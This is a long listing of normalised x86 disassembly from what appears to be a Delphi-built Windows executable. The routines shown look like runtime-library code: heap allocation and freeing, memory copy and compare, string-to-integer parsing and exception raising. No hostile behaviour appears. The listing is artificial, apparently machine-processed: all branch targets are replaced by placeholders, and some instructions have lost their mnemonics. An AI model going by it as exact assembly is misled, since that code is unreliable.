sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_402014
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bc0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e28
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f88
test al al
jne r-xdata
mov eax esi
call sub_401fe8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402108
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a1c
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402284
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401378
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_402014
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401380
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_4039d0
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_4039d0
jmp r-xdata
sub_402298
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40242a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a1c
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401378
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401380
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_4039d0
jmp r-xdata
call sub_401eb0
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bc0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e28
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bc0
sub_40243c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401eb0
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bc0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fb4
test al al
je r-xdata
call sub_401bc0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c84
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e28
jmp r-xdata
sub_402618
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026c9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a1c
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40243c
test al al
je r-xdata
push rw-data
call sub_401378
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402108
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028d8
mov eax ebx
call sub_402298
retn
push rw-data
call sub_401380
sub_4026dc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402838
sub_4026fc
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402838
sub_40271c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402838
mov [ ecx ] eax
mov al 0x2
jmp sub_402838
retn
mov [ ecx ] eax
retn
sub_4027ac
push ebx
push esi
call sub_405d64
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405d64
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405d64
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027ec
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405d64
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027e0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402874
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028d8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402918
add esp 0xfffffff8
push esp
call QueryPerformanceCounter
test eax eax
je r-xdata
call sub_401324
mov [ rw-data ] eax
pop ecx
pop edx
retn
mov eax [ esp ]
mov [ rw-data ] eax
pop ecx
pop edx
retn
sub_40299c
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_4029dc
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402864
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402a30
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402864
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402864
jmp r-xdata
sub_402a88
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028d8
pop ebx
retn
mov ecx ebx
sub_402aa4
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402b28
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402b98
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402bd4
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402cb4
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402cf4
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402da7 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402da7 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402da7
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_402fe0
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_403010
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012c4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403081
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
retn
sub_4030fc
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_4031a4
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4031fc
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404924
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_40321c
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_40564c
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_40324c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4032d0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4032e0
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4032d7
lea eax [ ebp - 0x8 ]
call sub_405634
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_40321c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40564c
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4032e0
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_403324
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_4033c4
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403364
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403394
push eax
push ecx
mov eax [ eax ]
call sub_403364
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403edc
call [ rw-data ]
sub_4033ac
push esi
mov esi edx
mov eax [ eax ]
call sub_403364
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403edc
call [ rw-data ]
sub_4033f4
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403364
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_40341c
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_40346c
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_4034bc
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4034e5
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403550
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_40358c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4035a0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4035b4
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_4035d4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
